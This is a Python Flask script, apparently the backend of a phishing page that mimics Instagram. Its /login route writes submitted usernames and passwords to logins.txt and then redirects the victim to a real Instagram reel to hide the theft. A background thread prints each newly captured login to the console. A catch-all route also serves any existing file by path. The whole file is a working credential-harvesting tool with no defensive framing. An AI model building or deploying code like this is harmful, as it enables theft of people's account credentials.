from flask import Flask, send_file, request, redirect, abort
import os
import threading
import time

# ANSI color codes
GREEN = '\033[92m'
BLUE = '\033[94m'
RED = '\033[91m'
RESET = '\033[0m'

app = Flask(__name__)

# Variable to keep track of file size
last_size = 0

def monitor_file():
    global last_size
    while True:
        if os.path.exists('logins.txt'):
            current_size = os.path.getsize('logins.txt')
            if current_size > last_size:
                with open('logins.txt', 'r') as f:
                    lines = f.readlines()
                    if lines:
                        last_line = lines[-1].strip()
                        username, password = last_line.split(" - ")
                        print(f"\n{GREEN}Novo login detectado:{RESET}")
                        print(f"{BLUE}{username}{RED} - {BLUE}{password}{RESET}")
                last_size = current_size
        time.sleep(1)  # Check every second

@app.route('/')
def index():
    return send_file('index.html')

@app.route('/styles.css')
def styles():
    return send_file('styles.css')

@app.route('/<path:filename>')
def images(filename):
    if os.path.exists(filename):
        return send_file(filename)
    return abort(404)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    with open('logins.txt', 'a') as f:
        f.write(f"{username} - {password}\n")
    
    return redirect("https://www.instagram.com/jovanenunesmm/reel/DDwmo1SRBu4/")

# Start the monitoring thread if we're not in production
if not os.environ.get('PRODUCTION'):
    monitor_thread = threading.Thread(target=monitor_file, daemon=True)
    monitor_thread.start()

if __name__ == '__main__':
    # Enable Windows ANSI colors
    os.system('color')
    app.run(port=3000, debug=True)
